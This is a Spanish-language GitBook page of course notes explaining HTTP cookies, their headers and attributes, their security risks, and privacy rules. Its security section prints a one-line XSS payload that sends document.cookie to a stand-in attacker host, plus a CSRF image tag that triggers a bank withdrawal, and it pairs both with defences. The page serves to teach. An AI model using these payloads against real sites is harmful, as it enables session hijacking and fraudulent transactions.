
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Cookies HTTP · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.2">
        
        
        
    
    <link rel="stylesheet" href="gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="setcookies.html" />
    
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="./">
            
                <a href="./">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" >
            
                <span>
            
                    
                    [Práctica Inicial]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="./">
            
                <a href="./">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="Pablo/nodejs.html">
            
                <a href="Pablo/nodejs.html">
            
                    
                    NodeJS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="Pablo/intro_gitbook.html">
            
                <a href="Pablo/intro_gitbook.html">
            
                    
                    Gitbook
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4" data-path="Pablo/gitbook.html">
            
                <a href="Pablo/gitbook.html">
            
                    
                    Gitbook, definición y línea de comandos
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.5" data-path="Javier/gitbook-desktop.html">
            
                <a href="Javier/gitbook-desktop.html">
            
                    
                    Gitbook Desktop
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6" data-path="Javier/atom.html">
            
                <a href="Javier/atom.html">
            
                    
                    Atom
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.7" data-path="Javier/hub.html">
            
                <a href="Javier/hub.html">
            
                    
                    Hub
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.8" data-path="Isaac/git.html">
            
                <a href="Isaac/git.html">
            
                    
                    Git
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.9" data-path="Pablo/gh-pages.html">
            
                <a href="Pablo/gh-pages.html">
            
                    
                    GitHub Pages
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.10" data-path="Isaac/pandoc.html">
            
                <a href="Isaac/pandoc.html">
            
                    
                    Pandoc
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.11" data-path="Javier/markdown.html">
            
                <a href="Javier/markdown.html">
            
                    
                    Markdown
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" >
            
                <span>
            
                    
                    [Rutas en Express-JS]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="./">
            
                <a href="./">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="BasisRouting.html">
            
                <a href="BasisRouting.html">
            
                    
                    Enrutamiento básico
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="RouterAPI.html">
            
                <a href="RouterAPI.html">
            
                    
                    Router API
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="RoutingGuide.html">
            
                <a href="RoutingGuide.html">
            
                    
                    Guía de direccionamiento
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="UsingMiddleware.html">
            
                <a href="UsingMiddleware.html">
            
                    
                    Utilización del middleware
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" >
            
                <span>
            
                    
                    [Cookies]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" >
            
                <span>
            
                    
                    Cookies
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="1.4.1.1" data-path="http-cookies.html">
            
                <a href="http-cookies.html">
            
                    
                    Cookies HTTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.1.2" data-path="setcookies.html">
            
                <a href="setcookies.html">
            
                    
                    Set Cookies
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="queryString.html">
            
                <a href="queryString.html">
            
                    
                    Query String
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" >
            
                <span>
            
                    
                    Módulos de node para cookies
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.3.1" data-path="cookie.md">
            
                <span>
            
                    
                    Módulo Cookie
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3.2" data-path="session-cookie.md">
            
                <span>
            
                    
                    Módulo "session cookies"
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.4" >
            
                <span>
            
                    
                    Uso de Cookies en Express
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.4.1" data-path="auth.html">
            
                <a href="auth.html">
            
                    
                    Un ejemplo simple
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4.2" data-path="cookies-express.html">
            
                <a href="cookies-express.html">
            
                    
                    Manejo de cookies en Express
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="." >Cookies HTTP</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="las-cookies-http">Las cookies HTTP</h1>
<p>Las cookies HTTP son un peque&#xF1;o pedazo de datos que un servidor manda al navegador de los usuarios, el
cual puede almanecarlo y volver a enviarlo junto con las siguientes peticiones a ese mismo servidor.
De forma general, son unadas para saber si dos peticiones vienen del mismo navegador (usuario) y
permitirle seguir con la sesi&#xF3;n iniciada mientras navega por la web del servidor. Son una forma de
aportar persistencia a los datos, cosa que HTTP no soporta de forma nativa.</p>
<h2 id="usos-de-las-cookies">Usos de las cookies:</h2>
<p>Los usos m&#xE1;s comunes de las cookies son:</p>
<ul>
<li>Administraci&#xF3;n de sesiones (Inicios de sesi&#xF3;n de usuarios, carritos de compra...)</li>
<li>Personalizaci&#xF3;n (Preferencias de los usuarios)</li>
<li>Seguimiento (An&#xE1;lisis del comportamiento de los usuarios)</li>
</ul>
<p>En el pasado las cookies tambi&#xE9;n se usaban como un medio de almacenamiento del lado del cliente, pero,
con la aparici&#xF3;n de mejores alternativas (Web Storage API e IndexedDB) no tiene sentido usarlas con
este prop&#xF3;sito, adem&#xE1;s, al enviarse las cookies con cada solicitud (request), pueden ocasionar un mal
rendimiento o una p&#xE9;rdida de datos m&#xF3;viles para los usuarios.</p>
<h2 id="creaci&#xF3;n-de-cookies">Creaci&#xF3;n de cookies:</h2>
<p>Cuando se recibe una petici&#xF3;n HTTP, un servidor puede enviar una cabecera <code>set-cookie</code> con la
respuesta. Esta cookie generalmente es almacenada por el cliente y mandada con cada nueva petici&#xF3;n al
mismo server mediante una cabecera <code>Cookie HTTP</code>. Adem&#xE1;s, se puede establecer un periodo de validez de
la misma, as&#xED; como restricciones a dominios y rutas espec&#xED;ficos.</p>
<h3 id="las-cabeceras-set-cookiey-cookie">Las cabeceras <code>Set-Cookie</code>y <code>Cookie</code></h3>
<p>La cabecera de respuesta HTTP <code>Set-Cookie</code> es usada para mandar cookies desde el servidor al navegador del usuario. Una cookie simple se puede mandar de la siguiente manera:</p>
<p><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</code></p>
<p>El servidor dice al navegador que guarde una cookie. La respuesta del servidor ser&#xE1;, en esencia, algo
as&#xED;:</p>
<pre><code>HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
</code></pre><p>Ahora, con cada petici&#xF3;n a ese server, el navegador mandar&#xE1; todas las cookies anteriormente
establecidas para ese servidor usando la cabecera <code>Cookie</code>:</p>
<pre><code>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
</code></pre><h3 id="cookies-de-sesi&#xF3;n">Cookies de sesi&#xF3;n</h3>
<p>La cookie creada en los ejemplos anteriores es una cookie de sesi&#xF3;n (session cookie). Ser&#xE1; borrada
cuando el cliente sea cerrado, por tanto, su ciclo de vida es s&#xF3;lo la sesi&#xF3;n del cliente. Esto es as&#xED;
porque no especifican ninguna directiva <code>Expires</code> o <code>Max-Age</code>. Sin embargo, en la actualidad muchos
navegadores ofrecen el servicio de restaurar la sesi&#xF3;n, por lo que las cookies de este tipo se
comportar&#xED;an como si fueran permanentes.</p>
<h3 id="cookies-permanentes">Cookies permanentes</h3>
<p>En lugar de expirar cuando el cliente es cerrado, las cookies permanentes expiran en una fecha
determinado (<code>Expires</code>) o tras un tiempo determinado (<code>Max-Age</code>)</p>
<p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></p>
<h3 id="cookies-seguras-y-httponly">Cookies seguras y HttpOnly</h3>
<p>Una cookie segura s&#xF3;lo ser&#xE1; enviada al servidor si la petici&#xF3;n se hace mediante SSL y HTTPS. Es
importante destacar que no se deben mandar o transmitir mediante Cookies HTTP, puesto que este
protocolo no ofrece ning&#xFA;n tipo de seguridad.</p>
<p>Para prevenir ataques XSS, las cookies HTTP-Only no son accesibles via Javascript a trav&#xE9;s de
<code>Document.cookie</code>, <code>XMLHHttpRequest</code> o la API <code>Request</code>. Esta caracter&#xED;stica es conveniente cuando el
contenido de las cookies no va a ser usado por JavaScript (Por ejemplo, para cookies que definen una
sesi&#xF3;n)</p>
<p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</code></p>
<h3 id="ambiente-de-las-cookies">Ambiente de las cookies</h3>
<p>Las directivas <code>Domain</code> y <code>Path</code> definen el ambiente de la cookie, o lo que es lo mismo, el conjunto
de URLs a las que las cookies deben mandarse.</p>
<p><code>Domain</code> especifica aquellos hotsts a los que la cookie ser&#xE1; enviada. Si no se especifica, por defecto
es la parte del host de la localizaci&#xF3;n del documento actual, pero sin incluir subdominios. Cuando se
especifica el host, s&#xED; se incluyen los subdominios.</p>
<p>Si se especifica <code>Domain=mozilla.org</code>, las cookies son inclu&#xED;das en subdominios como
<code>developer.mozilla.org</code>.</p>
<p><code>Path</code> indica una ruta que debe existir en la petici&#xF3;n si se quiere mandar una cookie a esa direcci&#xF3;n.
El caracter &apos;/&apos; se interpreta como separador de directorios, los subdirectorios ser&#xE1;n tambi&#xE9;n v&#xE1;lidos.</p>
<p>Si se establece <code>Path=/docs</code> las siguientes rutas ser&#xE1;n aceptadas:</p>
<ul>
<li>&quot;/docs&quot;</li>
<li>&quot;/docs/web&quot;</li>
<li>&quot;/docs/web/HTTP&quot;</li>
</ul>
<h3 id="cookies-samesite-api-experimental">Cookies SameSite (API EXPERIMENTAL)</h3>
<p>Las cookies <code>SameSite</code> permiten a los servidores afirmar que una cookie no debe ser enviada con
peticiones de sitios cruzados. Esto da alguna protecci&#xF3;n frente a ataques CSRF.</p>
<h3 id="acceso-desde-javascript-usando-documentcookies">Acceso desde JavaScript usando Document.cookies</h3>
<p>Nuevas cookies pueden ser creadas usando la propiedad <code>Document.cookie</code> y si la propiedad <code>HttpOnly</code>
no est&#xE1; activada, cookies existentes tambi&#xE9;n pueden ser accedidas de esta manera.</p>
<pre><code class="lang-javascript"><span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&quot;yummy_cookie=choco&quot;</span>;
<span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&quot;tasty_cookie=strawberry&quot;</span>;
<span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">document</span>.cookie);
<span class="hljs-comment">// logs &quot;yummy_cookie=choco; tasty_cookie=strawberry&quot;</span>
</code></pre>
<p>Es importante destacar que esto conlleva riesgos en seguridad, puesto que estas cookies podr&#xED;an ser
robadas mediante XSS.</p>
<h2 id="seguridad">Seguridad</h2>
<h3 id="secuestro-de-sesi&#xF3;n-y-xss">Secuestro de sesi&#xF3;n y XSS</h3>
<p>Las cookies, como se ha dicho, son usadas muchas veces en una aplicaci&#xF3;n web para identificar a un
usuario y su sesi&#xF3;n autentificada. Por este motivo, el robo de estas cookies puede suponer un posible
secuestro de la sesi&#xF3;n autentificada del usuario. Una v&#xED;a com&#xFA;n para robar cookies es usando XSS o
ingenier&#xED;a social.</p>
<pre><code class="lang-javascript">(<span class="hljs-keyword">new</span> Image()).src = <span class="hljs-string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="hljs-built_in">document</span>.cookie;
</code></pre>
<p>Una forma de evitar este riesgo es <code>HttpOnly</code></p>
<h3 id="csrf">CSRF</h3>
<p>Un buen ejemplo de CSRF puede ser una imagen que en realidad no lo sea, sino que el link a seguir sea
una petici&#xF3;n a tu banco para que mandes dinero:</p>
<pre><code class="lang-javascript">&lt;img src=<span class="hljs-string">&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;</span>&gt;
</code></pre>
<p>Si est&#xE1;s logeado en el banco y las cookies todav&#xED;a son v&#xE1;lidas (y no hay m&#xE1;s validaciones), se har&#xE1; la transferencia tan pronto como cargues el HTML. Algunas formas de evitarlo son:</p>
<ul>
<li>El filtrado de la entrada</li>
<li>Requerir confirmaciones para operaciones delicadas</li>
<li>Las cookies usadas para operaciones delicadas deber&#xED;an tener un corto periodo de vida.</li>
</ul>
<h2 id="seguimiento-y-privacidad">Seguimiento y privacidad</h2>
<h3 id="cookies-third-party">Cookies &quot;third-party&quot;</h3>
<p>Las cookies tienen un dominio asociado. Si ese dominio es el mismo que el dominio de la p&#xE1;gina en la
que est&#xE1;s, a estas cookies se les llama cookies &quot;fist-party&quot;. Si es diferentes, son &quot;third-party&quot;.</p>
<p>Mientras que las cookies &quot;first-party&quot; son mandadas s&#xF3;lo al servidor que las pone, una p&#xE1;gina web
puede contener im&#xE1;genes u otros componentes en otros servidores. Las cookies mandadas a trav&#xE9;s de
estos componentes ajenos son llamadas &quot;third-party&quot; y son usadas generalmente para publicidad y
Seguimiento a trav&#xE9;s de la web. La mayor&#xED;a de los navegadores permite las cookies &quot;third-party&quot; por
defecto, pero hay addons para bloquearlas.</p>
<p>El uso de estas cookies debe ser advertido para no da&#xF1;ar la confianza de los usuarios, adem&#xE1;s, existen
pa&#xED;ses con legislaciones al respecto.</p>
<h3 id="do-not-track">Do-Not-Track</h3>
<p>No hay requerimientos legales o tecnol&#xF3;gicos para su uso, pero la cabecera DNT puede ser usada para
se&#xF1;alar que una aplicaci&#xF3;n web debe deshabilitar su seguimiento o su seguimiento entre distintos
sitios para un usuario individual.</p>
<h3 id="directiva-europea-de-cookies">Directiva europea de cookies</h3>
<p>Los estados miembros europeos deben legislar a partir de esta directiva para asegurar que no se pueden
almacenar datos de un usuario sin el consentimiento expl&#xED;cito del mismo.</p>
<h3 id="cookies-zombies-y-evercookies">Cookies zombies y Evercookies</h3>
<p>Una aproximaci&#xF3;n m&#xE1;s radical a las cookies son las Cookies zombies o Evercookies, las cuales son
recreadas tras su eliminaci&#xF3;n y son intencionadamente dif&#xED;ciles de eliminar. Se usan mediante la API
<code>Web storage API</code>, <code>Flash Local Shared Objects</code> y otras t&#xE9;cnicas.</p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                
                <a href="setcookies.html" class="navigation navigation-next navigation-unique" aria-label="Next page: Set Cookies">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Cookies HTTP","level":"1.4.1.1","depth":3,"next":{"title":"Set Cookies","level":"1.4.1.2","depth":3,"path":"setcookies.md","ref":"setcookies.md","articles":[]},"previous":{"title":"Cookies","level":"1.4.1","depth":2,"ref":"","articles":[{"title":"Cookies HTTP","level":"1.4.1.1","depth":3,"path":"http-cookies.md","ref":"http-cookies.md","articles":[]},{"title":"Set Cookies","level":"1.4.1.2","depth":3,"path":"setcookies.md","ref":"setcookies.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"http-cookies.md","mtime":"2017-03-15T20:39:13.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-15T20:39:28.768Z"},"basePath":".","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="gitbook/gitbook.js"></script>
    <script src="gitbook/theme.js"></script>
    
        
        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

